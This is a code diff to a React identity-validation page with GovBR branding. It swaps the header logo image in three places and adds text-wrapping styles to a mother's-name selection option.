@@ -179,7 +179,7 @@ export default function Validacao() {
       <>
         <header>
           <a href="#">
-            <img src="/images/govbr.png" alt="Logomarca GovBR" />
+            <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
           </a>
         </header>
         <div className="container">
@@ -199,7 +199,7 @@ export default function Validacao() {
       <>
         <header>
           <a href="#">
-            <img src="/images/govbr.png" alt="Logomarca GovBR" />
+            <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
           </a>
         </header>
         <div className="container">
@@ -224,7 +224,7 @@ export default function Validacao() {
     <>
       <header>
         <a href="#">
-          <img src="/images/govbr.png" alt="Logomarca GovBR" />
+          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
         </a>
         <div id="acessibilidade">
           <span>
@@ -297,7 +297,7 @@ export default function Validacao() {
                           onChange={(e) => setNomeMaeSelecionado(e.target.value)}
                           style={{ marginRight: "10px" }}
                         />
-                        <span style={{ fontWeight: nomeMaeSelecionado === nome ? "bold" : "normal" }}>
+                        <span style={{ fontWeight: nomeMaeSelecionado === nome ? "bold" : "normal", wordBreak: "break-word", flex: 1 }}>
                           {nome}
                         </span>
                       </label>
